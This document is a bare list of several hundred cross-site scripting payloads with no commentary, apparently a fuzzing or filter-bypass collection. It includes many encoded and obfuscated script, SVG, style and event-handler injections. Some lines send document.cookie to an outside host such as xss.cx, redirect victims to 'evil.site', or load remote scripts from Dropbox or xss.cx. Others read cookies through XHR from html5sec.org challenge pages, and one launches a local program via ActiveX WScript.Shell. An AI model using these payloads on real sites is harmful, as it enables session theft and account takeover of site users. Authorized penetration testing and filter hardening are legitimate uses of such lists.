<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    confirm(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
<script>  (function (o) {   function exploit(x) {    if (x !== null)     confirm('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
<script /*%00*/>/*%00*/confirm(1)/*%00*/</script /*%00*/
<script ~~~>confirm(0%0)</script ~~~>
<script ^__^>confirm(String.fromCharCode(49))</script ^__^
'"`><script>/* **chr*log(*num*)// */</script>
<script>/* **chr*/log(*num*)// */</script>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script> document.getElementById(%22safe123%22).click=function()+{confirm(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script for=_ event=onerror()>confirm(/@ma1/)</script><img id=_ src=>
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<script itworksinallbrowsers>/*<script* */confirm(1)</script
<script itworksinallbrowsers>/*<script* */confirm(1)</script ?
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<script> logChr0x09(1); </script>
<script src=>confirm(8)</script>
"/><script src="data:text/javascript,confirm(1)"></script>
<script src="data:text/javascript,confirm(1)"></script>
"<script src='data:text/javascript,prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>"
"\"><script src='data:text/javascript,prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
<script src='data:text/javascript,prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>
><script src='data:text/javascript,prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>
<script type="text/xaml"><Canvas Loaded="confirm" /></script>
<script> "\ud83d\u*hex4*".match(/.*<.*/) ? log(*num*) : null; </script>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    confirm(c[1]); }catch(e){} };  xdr.send(); </script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{confirm(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
"/><script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); confirm(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); confirm(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> var+x+=+showModelessDialog+(this); confirm(x.document.cookie); </script>
"/><script x> confirm(1) </script 1=2
<script x> confirm(1) </script 1=2
<script/%00%00v%00%00>confirm(/@jackmasa/)</script> and %c0â€³//(%000000%0dconfirm(1)//
<script>({0:#0=confirm/#0#/#0#(0)})</script>
<script>(0)['constructor']['constructor']("\141\154\145\162\164(1)")();</script>
"<script>1-confirm(0);</script>"/>
"/><script>+-+-1-+-+confirm(1)</script>
<script>+-+-1-+-+confirm(1)</script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});confirm(Safe.get())</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});confirm(Safe.get())</script>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script>a='abc\*chr*\';log(*num*)//def';</script>
"<script>'confirm(0)%3B<%2Fscript>"
"\"><script>'confirm(0)%3B<%2Fscript>",
<script>'confirm(0)%3B<%2Fscript>
><script>'confirm(0)%3B<%2Fscript>
"<script>confirm(0);</script>"
"><"script">"confirm(0)"</"script">
"\"><script>confirm(0)</script>",
<script>confirm(0);</script>
><script>confirm(0)</script>
"'><script>confirm(1)</script>",
<sc'+'ript>confirm(1)</script>
<script>confirm(1)</script>
>"<>"<script>confirm(1)</script>
[<script>]=*confirm(1)</script>
âˆ€ã¸€ã°€scriptã¸€confirm(1)ã°€/scriptã¸€
<%<!--'%><script>confirm(1);</script -->
<%<!--'%><script>confirm(1);</script -->
"/><script>confirm(1);</script><img src=x onerror=x.onerror=prompt(0)>
"\"/><script>confirm(1);</script><img src=x onerror=x.onerror=prompt(0)>"
>"<>"<script>confirm(2)</script>
<script>confirm(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
"<script>confirm(String.fromCharCode(88,83,83));</script>"
"\"><script>confirm(String.fromCharCode(88,83,83));</script>",
<script>confirm(String.fromCharCode(88,83,83));</script>
><script>confirm(String.fromCharCode(88,83,83));</script>
<script>/*confirm("Woops");*/</script>
<script>confirm(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>confirm(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<script>confirm(document.head.childNodes[3].text)</script>
<script>confirm(document.head.innerHTML.substr(146,20));</script>
>"><script>confirm(document.location)</script>&
<script>confirm("&quot;no")</script>
<script>confirm(x.y[0])</script>
<script>confirm(x.y.x.y.x.y[0]);confirm(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
"'`><script>a=/xss;*chr*;i=0;log(*num*);a/i;</script>
"`'><script>*chr*log(*num*)</script>
<script>document.body.innerHTML="<h1>XSS-Here</h1>"</script>
<script>document.write(Array(184).join('<marquee>'))</script>
"/><script>document.write("<img src=//xss.cx/" + document.cookie + ">")</script>
<script>document.write("<img src=//xss.cx/" + document.cookie + ">")</script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });confirm(Safe.get.apply(null, arguments));})();</script>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<script>if("x\*chr*".length==1) { log(*num*);}</script>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
"`'><script>lo*chr*g(*num*)</script>
"`'><script>lo*chr*g(*num*)</script>
"'`><script>log*chr*(*num*)</script>
<script/onload=confirm(1)></script>
\"><script>prompt(1)</script>
</script><script>confirm(3)</script>
</script><script>/*var a="/*""'/**/;confirm(1);//</script>
<script>({set/**/$($){_/**/setter=$,_=1}}).$=confirm</script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
"/><script+src=data:,confirm(1)<!-- 
<script+src=data:,confirm(1)<!-- 
"/><script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
<script/src=//xss.cx>/*
<script>str='';for(i=0;i<0xefff;i++){str+='<script>AAAAAA';};document.write('<svg>'+str+'</svg>');</script>
</script><svg '//"
</script><svg onload='-/"/-confirm(1)//'
</script><svg onload='-/"/-confirm(1)//'"
<script>try{eval("<></>");logBoolean(1)}catch(e){logBoolean(0)};</script>
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/v>confirm(/@jackmasa/)</script>
<script>-{valueOf:location,toString:[].pop,0:'vbscript:confirm%281%29',length:1}</script> 
<script>var location={};</script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){confirm(request.responseText.substr(150,41));}</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _confirm = confirm;confirm = function() { confirm = _confirm };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });confirm(get());})();};safe123.click();</script>#
`'"><script>window['log*chr*'](*num*)</script>
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
<script>x="confirm(1)".replace(/.+/,eval)//"</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});confirm(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){confirm(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<script>x=""!=prompt(9)!="";y=42;</script>
<script>x=""%prompt(9)%"";y=42;</script>
<script>x=""&&prompt(9)&&"";y=42;</script>
<script>x=""&prompt(9)&"";y=42;</script>
<script>x=""*prompt(9)*"";y=42;</script>
<script>x=""+prompt(9)+"";y=42;</script>
<script>x=""-prompt(9)-"";y=42;</script>
<script>x=""/prompt(9)/"";y=42;</script>
<script>x=""<<prompt(9)<<"";y=42;</script>
<script>x=""<=prompt(9)<="";y=42;</script>
<script>x=""<prompt(9)<"";y=42;</script>
<script>x=""===prompt(9)==="";y=42;</script>
<script>x=""==prompt(9)=="";y=42;</script>
<script>x="">=prompt(9)>="";y=42;</script>
<script>x="">>>prompt(9)>>>"";y=42;</script>
<script>x="">>prompt(9)>>"";y=42;</script>
<script>x="">prompt(9)>"";y=42;</script>
<script>x=""?prompt(9):"";y=42;</script>
<script>x=""^prompt(9)^"";y=42;</script>
<script>x=""|prompt(9)|"";y=42;</script>
<script>x=""||prompt(9)||"";y=42;</script>
"><scri<script></script>pt>confirm(document.cookie);</scri<script></script>pt>
<scri\x00pt>confirm(1);</scri%00pt>
setTimeout(['confirm(4)']);
<span id="x" data-constructor=oops></span><script>confirm(x.dataset.constructor)</script>
stop, open, print && confirm(1)
</style &#32;><script &#32; :-(>/**/confirm(document.location)/**/</script &#32; :-(
<style>body{font-size: 0;} h1{font-size: 12px !important;}</style><h1><?php echo "<hr />THIS IMAGE COULD ERASE YOUR WWW ACCOUNT, it shows you the PHP info instead...<hr />"; phpinfo(); __halt_compiler(); ?></h1>
<style>*{font-family:'Serif}';x[value=expression(confirm(URL=1));]{color:red}</style>
<style>*{-o-link:'data:text/html,<svg/onload=confirm(5)>';-o-link-source:current}</style><a href=1>aaa
<style/onload    =    !-confirm&#x28;1&#x29;>
<style/onload=confirm(1)>
<style/onload="javascript:if('[object Object]'=={}&&1==[1])confirm(1);">
<style/onload=&lt;!--&#09;&gt;&#10;confirm&#10;&lpar;1&rpar;>
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style>p[foo=bar{}*{-o-link:'javascript:confirm(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
<///style///><span %2F onmousemove='confirm&lpar;1&rpar;'>SPAN
<style>//<!--</style> -->*{x:expression(confirm(4))}//<style></style>
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg contentScriptType=text/vbs><script>XSS
<svg id=1 onload=confirm(1)> 
<svg onload=confirm(1)
"><svg onload="confirm(7)">
<svg onload="confirm(7)">
<svg onload=eval(URL)>
<svg onload=eval(document.cookie)>
<svg onload=eval(window.name)>
<svg xml:base="data:text/html,<script>confirm(1)</script>"><a xlink:href="#"><circle r="40"></circle></a></svg>
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:confirm(1)"></g></svg>
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:confirm(1)" begin="0s" dur="0.1s" fill="freeze"/>
<svg></ y="><x" onload=confirm(4)>
<svg><doh onload=confirm(1)>
<svg><image x:href="data:image/svg-xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='confirm(1)'%3E%3C/svg%3E">
"<svg/onload=confirm(0);prompt(0);>"
<svg/onload=confirm(0);prompt(0);>
<svg/onload=confirm(1)
"/><svg/onload=confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>
"\"/><svg/onload=confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>"
<svg/onload='javascript0x00:void(0)%00?void(0)&colon;confirm(1)'>
"<svg/onload=prompt(0);>"
<svg/onload=prompt(0);>
"<svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);confirm(0);>"
"\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);confirm(0);>",
<svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);confirm(0);>
><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);confirm(0);>
<svg/onload=window.onerror=confirm;throw/5/;//
<svg/onload=window.onerror=confirm;throw/XSS/;//
<svg/onload=window.onerror=confirm;throw/XSS/;//"
<svg><script ?>confirm(1)
<svg><script ?>confirm(1);
<svg><script onlypossibleinopera:-)> confirm(1)
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js'
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script><![CDATA[\]]><![CDATA[u0061]]><![CDATA[lert]]>(1)</script>
"/><svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
<svg><script>confirm&#40/1/&#41</script>
<svg><script>confirm("&quot;);confirm('yes')//no")</script>
<svg><script>a<svg//onload=confirm(2) />lert(1)</script>
<svg><script>location&equals;&#60&#62javascript&amp;#x3A;confirm(1)&#60&#33&#47&#62;</script>
<svg><script>/*&midast;&sol;confirm(3)&sol;&sol;*/</script></svg>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<svg><style>*{font-family:'<svg onload=confirm(1)>';}</style></svg>
<svg><style>&ltimg src=x onerror=confirm(1)&gt</svg>
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>confirm&#x28;1&#x29;
?t=confirm(1)&k7="><svg/t='&k8='onload='/&k9=/+eval(t)'
test=scriptx=document.createElement(%27script%27);x.innerHTML=%27confirm(location)%27;document.body.appendChild(x);/script&notbot=UzXGjMCo8AoAAFUcKTEAAAAN
<textarea autofocus onfocus=confirm(3)>
<textarea id=ta onfocus=%22write('<script>confirm(1)</script>')%22 autofocus></textarea>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520confirm(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
"/><textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea name='file"; filename="test.<img src=a onerror=document&amp;#46;location&amp;#61;&amp;#34;http:&amp;#47;&amp;#47;evil&amp;#46;site&amp;#34;>'>
"<textarea onmousemove='confirm(1);'>"
<textarea></textarea>test<!-- </textarea><img src=xx: onerror=confirm(1)> --> 
</title><frameset><frame src="data:text/html, fill the whole page and overlap everything<script>confirm(1)</script>">
</title><frameset><frame src="data:text/html,<script>confirm(1)</script>">
<ul><li><svg onload="confirm(1)"></li></ul>
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:confirm(document.location);">
<var onmouseover="prompt(1)">On Mouse Over</var>
<var onmouseover="prompt(1)">On Mouse Over</var>?
"<video src=. onerror=prompt(0)>"
<video src=. onerror=prompt(0)>
<video src="x" onloadstart="confirm(1)">
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{confirm(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<video><source o?UTF-8?Q?n?error="confirm(1)">
<x data-bind=".:confirm(1)">
<x data-bind=".:&#x5cu0061lert(1)">
<x onload'=confirm(1)
&#x000003C
&#x000003C;
&#x000003E
&#x000003E;
&#x000003c
&#x000003c;
&#x000003e
&#x000003e;
&#x00003C
&#x00003C;
&#x00003E
&#x00003E;
&#x00003c
&#x00003c;
&#x00003e
&#x00003e;
&#x0003C
&#x0003C;
&#x0003E
&#x0003E;
&#x0003c
&#x0003c;
&#x0003e
&#x0003e;
&#x003C
&#x003C;
&#x003E
&#x003E;
&#x003c
&#x003c;
&#x003e
&#x003e;
&#x03C
&#x03C;
&#x03E
&#x03E;
&#x03c
&#x03c;
&#x03e
&#x03e;
&#x3C
&#x3C;
\x3C
&#x3E
&#x3E;
\x3E
&#x3c
&#x3c;
\x3c
&#x3e
&#x3e;
\x3e
<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(confirm(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
<xmp><img alt="</xmp><img src=xx:x onerror=confirm(1)//">
xss--><!--<script>xss
xâ€</title><img src%3dx onerror%3dconfirm(1)>
@"><img src=x/onerror=confirm(1)>xss
<script>x=new ActiveXObject("WScript.Shell");x.run('calc');</script>
"><<x>script>confirm(2)<<x>/<x>script>
<img src=x onerror="document.location='http:&#x2F;&#x2F;xss.cx'";>
!#$%&'*+-/=?^_`{}|~@xss.cx
~~)1(trela+tpircsavaj'.split('').reverse().join('').split('~').join(String.fromCharCode(47)).split('+').join(String.fromCharCode(58))).concat('
<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(confirm(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
<style/>&lt;/style&gt;&lt;img src=1 onerror=confirm(1)&gt;</style>
<script>
x="<%";
</script>
<div title="%&gt;&lt;/script&gt;&quot;&lt;img src=1 onerror=confirm(1)&gt;"></div>
<? foo="><script>confirm(1)</script>">
data:text/html,/*<img src=x '-confirm(1)-' onerror=confirm(1)>*/confirm(1)
'">><marquee><img src=x onerror=confirm(1)></marquee>
<div contextmenu=x>right-click<menu id=x onshow=confirm(1)>
"><b/onclick="javascript:window.window.window['confirm'](1)">bold
<body language=vbs onload=window.location='data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+'>
<IFRAME/SRC=DATA:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8NU1JDPSINSFRUUFM6DS8NDS8NSEVJREVSSS5DSC96DSINID4NPC9TQ1JJUFQNDT5>
%uff1cscript%uff1econfirm%uff0876310%uff09%uff1c/script%uff1e
<script>``.constructor.constructor`confirm\`1\````</script>
eval("\x61\x6c\x65\x72\x74\x28\x31\x29â€)
<script>var%20x%20=%20â€œaâ€;%20confirm(1);//â€;</script>
<source srcset="x"><img onerror="confirm(5)"></picture>
<svg><script>confirm&DiacriticalGrave;1&DiacriticalGrave;<p><svg><script>confirm&grave;1&grave;<p>
<script>``.constructor.constructor`confirm\`1\````</script>
<i/style=x=x/**/(confirm(1))('\')expression\')>
<i/style=x=x/**/n(confirm(1))('\')expressio\')>
<div style='x:anytext/**/xxxx/**/n(confirm(1)) ("\"))))))expressio\")'>aa</div> //
<script>write(â€œ<img/src=//xss.cx/?â€+cookie.replace(/\s/g,"")+â€œ>â€)></script>
<base href="javascript:\"> <a href="//%0aconfirm(2);//">XSS</a>
<base href="javascript:\"> <a href="//%0a%0dconfirm(2);//">XSS</a>
<base href="javascript:\"> <a href="//%00confirm(2);//">XSS</a>
<base href="javascript:\"> <a href="//xss.cx/xss.js">XSS</a>
<script src="//â’•â‚¨"></script>)
<anything onmouseover=javascript:confirm(1)>
<%00/title>
<""/title>
</title"">
</title id="">
<a href='javascript:http://@cc_on/confirm%28location%29'>click</a>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==">
<a href="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="><img src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></a>
">    "><iframe src=http://xss.cx onload=confirm(5) <<iframe src=a>    "><iframe src=http://xss.cx onload=confirm(8) <
% E2% 88% 80% E3% B8% 80% E3% B0% 80script% E3% B8% 80confirm% 281% 29% E3% B0 % 80 80/script% E3% B8%
"><svg/onload=prompt(1)>
"onresize=prompt(1)>
<svg/onload=prompt(1)
<svg><script>prompt&#40;1)<b>
<svg><script>prompt&#40;1)</script>
<script>eval.call`${'prompt\x281)'}`</script>
<script>prompt.call`${1}`</script>
--!><svg/onload=prompt(1)
<p class="comment" title=""><svg/a="></p>
<p class="comment" title=""onload='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
"><svg/a=#"onload='/*#*/prompt(1)'
"><script x=#"async=#"src="//â’›â‚¨
[U+2028]prompt(1)[U+2028]-->
<Å¿vg><Å¿cript/href=//â’•â‚¨>
<Å¿cript/async/src=//â’›â‚¨>
<img src=""><SCRIPT/ASYNC/SRC="/ã€³â’›â‚¨">
"><script>`#${prompt(1)}#`</script>
<script>alert(123)</script>
&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
<img src=x onerror=alert(123) />
<svg><script>123<1>alert(123)</script> 
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
< / script >< script >alert(123)< / script >
 onfocus=JaVaSCript:alert(123) autofocus 
" onfocus=JaVaSCript:alert(123) autofocus 
' onfocus=JaVaSCript:alert(123) autofocus 
＜script＞alert(123)＜/script＞
<sc<script>ript>alert(123)</sc</script>ript>
--><script>alert(123)</script>
";alert(123);t="
';alert(123);t='
JavaSCript:alert(123)
;alert(123);
src=JaVaSCript:prompt(132)
"><script>alert(123);</script x="
'><script>alert(123);</script x='
><script>alert(123);</script x=
" autofocus onkeyup="javascript:alert(123)
' autofocus onkeyup='javascript:alert(123)
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
